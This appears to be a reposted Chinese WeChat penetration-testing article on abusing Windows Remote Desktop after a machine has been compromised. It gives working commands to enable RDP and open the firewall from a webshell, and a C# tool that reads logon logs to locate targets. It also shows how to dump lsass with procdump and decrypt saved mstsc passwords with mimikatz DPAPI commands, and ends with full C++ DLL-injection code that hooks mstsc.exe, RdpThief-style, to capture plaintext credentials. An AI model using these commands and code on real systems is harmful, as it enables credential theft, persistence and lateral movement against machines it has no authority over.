> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/2VhSEIapWiTJ0_GrDuPyew)

![](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif)  

> **文章来****源****：** **HACK 学习呀**

> 在常见渗透过程中我们拿到了一个 pc 权限，目标 pc 的 mstsc 可能保存了其他机器的密码。所以获取它保存的密码是非常有利用价值的。

0x01 查询是否开启 3389
================

1.1
---

3389 开启的进程名为 TermService，所以我们可以查看是否开启这个进程

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibYZtI4ytczowQ0pCSsgdibppKwZOPSOcaFIodKbKvicibic7hUjurwN8YdgqVWRsyyjsqgqK7CUBiacQA/640?wx_fmt=png)

```
tasklist /svc | findstr TermService
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibYZtI4ytczowQ0pCSsgdibplq5jiaf71abKqc4qOlcWmOCQdp3Iwz0PlVyV3tPCz3aCKWJ6Up7uRpA/640?wx_fmt=png)

1.2
---

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibYZtI4ytczowQ0pCSsgdibpatWsLfgic0fSJReSib27c4iaOgOBLA5owl3BIMQgWC181JkPEq6DtE7pw/640?wx_fmt=png)

0x02 查看 rdp 开启具体端口
==================

很多运维为了安全起见可能会修改默认 3389 端口为其他端口

2.1
---

```
tasklist /svc | findstr TermServicenetstat -ano | findstr "前面获取到的pid"
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibYZtI4ytczowQ0pCSsgdibp3mOiaic9mfpRBib71RmYqPVe4I05AMX3TaYXAZe9qicNkD1OM0IBJaH05g/640?wx_fmt=png)

2.2
---

```
REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /V PortNumber
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibYZtI4ytczowQ0pCSsgdibpc5WJDicu22mhAkdrWvtuMGlkoqs3TT475Lz53s50zdA9gQ88Mj6I7fw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibYZtI4ytczowQ0pCSsgdibpX3srLD7JpBUGA4AZZXHB5SichRwTicTEo2ic6M8jw0vNB4GQaTLice249g/640?wx_fmt=png)

0x03 如何开启 3389
==============

如果获取到目标高权限的 webshell 可以通过命令开启 3389

3.1
---

允许 3389 端口放行

```
netsh advfirewall firewall add rule name=”Remote Desktop” protocol=TCP dir=in localport=3389 action=allow
```

①：通用开 3389(优化后)：

```
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
```

②：For Win2003:

```
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```

③：For Win2008:

```
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
```

④：For Every: cmd 开 3389 win08 win03 win7 win2012 winxp win08，三条命令即可:

```
wmic /namespace:\root\cimv2 erminalservices path win32_terminalservicesetting where (__CLASS != "") call setallowtsconnections 1  wmic /namespace:\root\cimv2 erminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 1  reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
```

3.2
---

使用 [RegfDenyTSConnections.ps1] https://github.com/QAX-A-Team/EventLogMaster/blob/master/powershell/RegfDenyTSConnections.ps1 脚本

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibYZtI4ytczowQ0pCSsgdibp0icCX25KT4HlVFMy6mgqs9FdqF3k0axiaPGcqOB0E1AXntQ9hfg7Z2Ww/640?wx_fmt=png)

0x04 获取登录日志
===========

在 windows 事件里面 id 为 4624 和 4635 分别为成功登录和失败登录

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibYZtI4ytczowQ0pCSsgdibp2SflEzDQIPGAG3DPy31rPibic6Q3HY1C94eibt5ahZXIEsFebdLd3vjJw/640?wx_fmt=png)

这里看下 4624 的详情

```
已成功登录帐户。主题:    安全 ID:        SYSTEM        帐户名:        WIN-4BS4SH00L5N$    帐户域:        REDTEAM    登录 ID:        0x3e7登录类型:            10新登录:    安全 ID:        WIN-4BS4SH00L5N\test    帐户名:        test    帐户域:        WIN-4BS4SH00L5N    登录 ID:        0xfd71e    登录 GUID:        {00000000-0000-0000-0000-000000000000}进程信息:    进程 ID:        0xbcc    进程名:        C:\Windows\System32\winlogon.exe网络信息:    工作站名:    WIN-4BS4SH00L5N    源网络地址:    192.168.11.12    源端口:        63275详细身份验证信息:    登录进程:        User32     身份验证数据包:    Negotiate    传递服务:    -    数据包名(仅限 NTLM):    -    密钥长度:        0
```

4625:

```
帐户登录失败。主题:    安全 ID:        SYSTEM    帐户名:        WIN-4BS4SH00L5N$    帐户域:        WORKGROUP    登录 ID:        0x3e7登录类型:            2登录失败的帐户:    安全 ID:        NULL SID    帐户名:        Administrator    帐户域:        WIN-4BS4SH00L5N失败信息:    失败原因:        指定帐户的密码已过期。    状态:            0xc0000224    子状态:        0x0进程信息:    调用方进程 ID:    0x184    调用方进程名:    C:\Windows\System32\winlogon.exe网络信息:    工作站名:    WIN-4BS4SH00L5N    源网络地址:    127.0.0.1    源端口:        0详细身份验证信息:    登录进程:        User32     身份验证数据包:    Negotiate    传递服务:    -    数据包名(仅限 NTLM):    -    密钥长度:        0
```

在一些溯源工作可能会用到，还有就是当我们撸下一台服务器我们想定位到办公区或者 it，运维组可以通过该方法

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibYZtI4ytczowQ0pCSsgdibp0vCXOKpJibbG9aNOlOicPutB9DhGgHO2icuyoMicRAl3NAN3Mklic16csLw/640?wx_fmt=png)

```
using System;using System.Collections.Generic;using System.Diagnostics;using System.Linq;using System.Text;namespace SharpEventLog{    class Program    {        static void Main(string[] args)        {            if (args.Length == 0)            {                System.Console.WriteLine("Usage: EventLog.exe -4624");                System.Console.WriteLine("       EventLog.exe -4625");            }            if (args.Length == 1 && args[0] == "-4624")            {                EventLog_4624();            }            if (args.Length == 1 && args[0] == "-4625")            {                EventLog_4625();            }                    }        public static void EventLog_4624()        {            EventLog log = new EventLog("security");            Console.WriteLine("\r\n========== 4624 ==========\r\n");            var entries = log.Entries.Cast<EventLogEntry>().Where(x => x.InstanceId == 4624);            entries.Select(x => new            {                x.MachineName,                x.Site,                x.Source,                x.Message,                x.TimeGenerated            }).ToList();            foreach (EventLogEntry log1 in entries)            {                string text = log1.Message;                string ipaddress = MidStrEx(text, "    源网络地址:    ", "    源端口:");                string username = MidStrEx(text, "新登录:", "进程信息:");                username = MidStrEx(username, "    帐户名:        ", "    帐户域:        ");                DateTime Time = log1.TimeGenerated;                if (ipaddress.Length >= 7)                {                    Console.WriteLine("\r\n-----------------------------------");                    Console.WriteLine("Time: " + Time);                    Console.WriteLine("Status: True");                    Console.WriteLine("Username: " + username.Replace("\n", "").Replace(" ", "").Replace("\t", "").Replace("\r", ""));                    Console.WriteLine("Remote ip: " + ipaddress.Replace("\n", "").Replace(" ", "").Replace("\t", "").Replace("\r", ""));                }            }        }        public static void EventLog_4625()        {            EventLog log = new EventLog("Security");            Console.WriteLine("\r\n========== 4625 ==========\r\n");            var entries = log.Entries.Cast<EventLogEntry>().Where(x => x.InstanceId == 4625);            entries.Select(x => new            {                x.MachineName,                x.Site,                x.Source,                x.Message,                x.TimeGenerated            }).ToList();            foreach (EventLogEntry log1 in entries)            {                string text = log1.Message;                string ipaddress = MidStrEx(text, "    源网络地址:    ", "    源端口:");                string username = MidStrEx(text, "新登录:", "进程信息:");                username = MidStrEx(username, "    帐户名:        ", "    帐户域:        ");                DateTime Time = log1.TimeGenerated;                if (ipaddress.Length >= 7)                {                    Console.WriteLine("\r\n-----------------------------------");                    Console.WriteLine("Time: " + Time);                    Console.WriteLine("Status: Flase");                    Console.WriteLine("Username: " + username.Replace("\n", "").Replace(" ", "").Replace("\t", "").Replace("\r", ""));                    Console.WriteLine("Remote ip: " + ipaddress.Replace("\n", "").Replace(" ", "").Replace("\t", "").Replace("\r", ""));                }            }        }        public static string MidStrEx(string sourse, string startstr, string endstr)        {            string result = string.Empty;            int startindex, endindex;            startindex = sourse.IndexOf(startstr);            if (startindex == -1)                return result;            string tmpstr = sourse.Substring(startindex + startstr.Length);            endindex = tmpstr.IndexOf(endstr);            if (endindex == -1)                return result;            result = tmpstr.Remove(endindex);            return result;        }    }}
```

0x05 mstsc 保存密码 - 解密
====================

5.1
---

可以通过

```
cmdkey /ldir /a %userprofile%\AppData\Local\Microsoft\Credentials\*
```

来查看是否存在凭证

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibYZtI4ytczowQ0pCSsgdibpZP4JFNhWLOxCvu5D9mGTAtPOqxtt0ly5FXXQiawqlno0NhHlpDRvdWA/640?wx_fmt=png)

```
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```

procdump64 来获取内存文件

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibYZtI4ytczowQ0pCSsgdibpJUkeU4xibE42LsmZia5WtWpiaxjI5sLJjpvdjvlws8AS4fiaAm3wj6F2cg/640?wx_fmt=png)

然后使用 mimikatz 获取 guidMasterKey:

```
{12f037b9-df42-4dcf-b9e0-31b57d26c544}
```

```
mimikatz.exe "dpapi::cred /in:C:\Users\jack\AppData\Local\Microsoft\Credentials\B57C0630F49BB26F284ECFD8DCD9E0A2" "exit" > 1.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibYZtI4ytczowQ0pCSsgdibpyW55Ykjhf1CsfqbXFds4XANSCoccyXvT51mFaXr2ibJaB9p6nwQspQQ/640?wx_fmt=png)

然后加载 dmp 获取对应的 MasterKey:

```
ba3ebb5374ea4623a1fcc006ac4552bbb17301b539e62c066f7f4e8ba2931789a48699e276f569535f12dc7a1f42bbbccd35e51c60f19ee3560ee155d9a7c078
```

```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::dpapi" "exit" > 2.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibYZtI4ytczowQ0pCSsgdibpV3JNmr0b6r932uZqwIwYx9DSB5ye1P4MckGaTISyXZD07u0FwOlBaQ/640?wx_fmt=png)

然后使用 MasterKey 进行解密

```
mimikatz.exe "dpapi::cred /in:C:\Users\jack\AppData\Local\Microsoft\Credentials\B57C0630F49BB26F284ECFD8DCD9E0A2 /masterkey:ba3ebb5374ea4623a1fcc006ac4552bbb17301b539e62c066f7f4e8ba2931789a48699e276f569535f12dc7a1f42bbbccd35e51c60f19ee3560ee155d9a7c078" "exit" > 3.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibYZtI4ytczowQ0pCSsgdibpmkGmIBn83xv31Z44l0USlicXE4IDUVj3xicBTafBcYvO3D1dMARiaNURw/640?wx_fmt=png)

5.2
---

当用户通过 RDP 连接进行身份验证的时候，终端服务是由 svchost 进程托管，凭证是以纯文本形式储存在 svchost 进程的内存中。但是在进程里面有很多 svchost 进程。因此可以通过执行以下命令之一来识别哪个进程，hosts 终端服务连接。

```
sc queryex termservice
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibYZtI4ytczowQ0pCSsgdibphqSEZAMemJibVI6JCia2mYl3xgNYLicZEqV0NO8UiaUHOuhZPxTdbRROBw/640?wx_fmt=png)

查询是那个进程加载了 rdpcorets.dll

```
tasklist /M:rdpcorets.dll
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibYZtI4ytczowQ0pCSsgdibpvqDsCU1ib1mqw3T0axHRtH5sSgDrAiaibg5CuFcoHkQvCttLKuu8qRfCg/640?wx_fmt=png)

可以指定 pid 写入 dmp 文件来转存内存

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibYZtI4ytczowQ0pCSsgdibppXRiccG5ib89W4iad406eZuXEohib0ayqg29lfgGfyGRGfb9wRkZYy8Siaw/640?wx_fmt=png)

然后可以在 kali 进行离线分析

```
strings -el svchost*
```

0x06 hook mstsc
===============

一般获取 mstsc 密码来说就两种方法，第一种获取运行后保存在内存中的密码，第二就是 hook mstsc 截获密码。前文写过如何获取保存后的密码，现在来讲解如何 hook。

6.1 Detours 库
-------------

该库支持 32 位和 64 位进程，这里拿 MessageBox 函数来进行讲解。在做挂钩的时候必须要确定原始函数的地址和钩子函数地址的目标指针。

### 6.1.1 Detours 库安装

[源码下载地址]：https://github.com/Microsoft/Detours。这里以 64 位进行实验。

使用 vs 的命令行在 src 目录执行（x64 Native Tools Command Prompt for VS 2019 和 x86 Native Tools Command Prompt for VS 2019，这两个可以分别用来编译 64 位和 32 位的 Detours）

```
nmake
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibYZtI4ytczowQ0pCSsgdibpPFicVmjWVlsmX3poiciafAYM80c4KymViaSUibGU1DYelib8p916m1YDmT4Q/640?wx_fmt=png)

编译后会生成一下三个目录

> •bin.X64•include•lib.X64

vs 建立工程添加

•detours.h•detours.lib

打开程序包管理器控制台执行

```
Install-Package Detours
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibYZtI4ytczowQ0pCSsgdibp4ZuWPgnqInibfFw3hamE2ic98MAe35fiaawDLYYmNHK2qep3TAZKAeuVA/640?wx_fmt=png)

然后导入. h 和. lib 文件即可。

```
#include <Windows.h>#include <detours.h>#pragma comment (lib,"detours.lib")static int(WINAPI* TrueMessageBox)(HWND, LPCTSTR, LPCTSTR, UINT) = MessageBox;int WINAPI OurMessageBox(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType) {    return TrueMessageBox(NULL, L"Hooked", lpCaption, 0);}int main(){    DetourTransactionBegin();    DetourUpdateThread(GetCurrentThread());    DetourAttach(&(PVOID&)TrueMessageBox, OurMessageBox);    DetourTransactionCommit();    MessageBox(NULL, L"11ccaab", L"11ccaab", 0);    DetourTransactionBegin();    DetourUpdateThread(GetCurrentThread());    DetourDetach(&(PVOID&)TrueMessageBox, OurMessageBox);    DetourTransactionCommit();}
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibYZtI4ytczowQ0pCSsgdibpI6ibpS9mOPm6Clrgwibv5Gwvcib1aC1Ibv3pLibS7C0kicNmwRc4DgxPX0w/640?wx_fmt=png)

6.2 API Monitor 监控 mstsc
------------------------

附加到 mstsc 进程，然后监听

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibYZtI4ytczowQ0pCSsgdibpTwDaUlopKv0oKKTYZeibibWPYQV6J84rPTsAHcCibXlLOSaSnUcgc5G6g/640?wx_fmt=png)

可以看到 ip 存放于 CredReadW 方法中

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibYZtI4ytczowQ0pCSsgdibpI8voiagc4f2CfickLGzUVloPLfDLibH29YdhjImzhGAhib9p5emsC22V9g/640?wx_fmt=png)

6.3 RdpThief
------------

[RdpThief]：https://github.com/0x09AL/RdpThief 编译好是一个 DLL，当注入 mstsc.exe 进程时，它将执行 API 挂钩，提取明文凭据并将它们保存到 %temp%/data.bin 文件中。

6.4 dll 注入
----------

```
#include <Windows.h>#include <TlHelp32.h>#include <string>typedef void(*PFN_FOO)();int main(){    //获取快照    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    PROCESSENTRY32 pe32;    DWORD pid = 0;    pe32.dwSize = sizeof(PROCESSENTRY32);    //查看第一个进程    BOOL bRet = Process32First(hSnap, &pe32);    while (bRet)    {        bRet = Process32Next(hSnap, &pe32);        if (wcscmp(pe32.szExeFile, L"mstsc.exe") == 0){            pid = pe32.th32ProcessID;            break;        }    }    //获取进程句柄    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);    HANDLE hDestModule = NULL;    //接下来找到该进程中kernel32.dll的基址    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);    MODULEENTRY32 mo32 = { 0 };    mo32.dwSize = sizeof(MODULEENTRY32);    bRet = Module32First(hSnap, &mo32);    while (bRet)    {        bRet = Module32Next(hSnap, &mo32);        wprintf(mo32.szExePath);        std::wstring wstr = mo32.szExePath;        if (wstr.find(L"KERNEL32.DLL") != std::string::npos){            hDestModule = mo32.modBaseAddr;            break;        }            }    LPVOID lpDestAddr = NULL;    if (hDestModule != NULL){        //获取本进程的kernel32地址        HMODULE hkernel32 = GetModuleHandleA("KERNEL32.DLL");        //计算函数的位置        LPVOID lploadlibrary = GetProcAddress(hkernel32, "LoadLibraryA");        //获取了目标进程中的loadlibrary的地址        lpDestAddr = (char*)lploadlibrary - (char*)hkernel32 + (char*)hDestModule;    }        //1.在目标进程开辟空间    LPVOID lpAddr = VirtualAllocEx(        hProcess,    //在目标进程中开辟空间        NULL,    //表示任意地址，随机分配        1,    //内存通常是以分页为单位来给空间 1页=4k 4096字节        MEM_COMMIT,    //告诉操作系统给分配一块内存        PAGE_EXECUTE_READWRITE        );    if (lpAddr == NULL){        printf("Alloc error!");        return 0;    }    DWORD dwWritesBytes = 0;    char* pDestDllPath = R"(C:\TestDLL.dll)";    //2.在目标进程中写入目标dll的路径    bRet = WriteProcessMemory(        hProcess,    //目标进程        lpAddr,    //目标地址    目标进程中        pDestDllPath,    //源数据    当前进程中        strlen(pDestDllPath)+1,    //写多大        &dwWritesBytes //成功写入的字节数        );    if (!bRet){        VirtualFreeEx(hProcess, lpAddr, 1, MEM_DECOMMIT);        return 0;    }    //3.向目标程序调用一个线程 创建远程线程 执行写入代码    HANDLE hRemoteThread = CreateRemoteThread(hProcess,    //目标进程        NULL,        0,        (LPTHREAD_START_ROUTINE)lpDestAddr,    //目标进程的回调函数        lpAddr,    //回调参数        0,        NULL        );    return 0;}
```

运行加载 dll，使用 Process Explorer 可以看到成功加载了 dll

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibYZtI4ytczowQ0pCSsgdibpSe0YqhaenTm1Ms51797mfEr4K5kHwzr36SWrDKD7eMtsUKVgSJmrbw/640?wx_fmt=png)

无论是否登录成功密码都会保存在

```
C:\Users\your username\AppData\Local\Temp\data.bin
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibYZtI4ytczowQ0pCSsgdibpQiaPoKnia02HX1IK8D4ddpX5WmmoozyKUEPiaboibq14NBbfsUMmpdjFqg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_jpg/3xxicXNlTXLicjiasf4mjVyxw4RbQt9odm9nxs9434icI9TG8AXHjS3Btc6nTWgSPGkvvXMb7jzFUTbWP7TKu6EJ6g/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLib0FWIDRa9Kwh52ibXkf9AAkntMYBpLvaibEiaVibzNO1jiaVV7eSibPuMU3mZfCK8fWz6LicAAzHOM8bZUw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/NZycfjXibQzlug4f7dWSUNbmSAia9VeEY0umcbm5fPmqdHj2d12xlsic4wefHeHYJsxjlaMSJKHAJxHnr1S24t5DQ/640?wx_fmt=gif)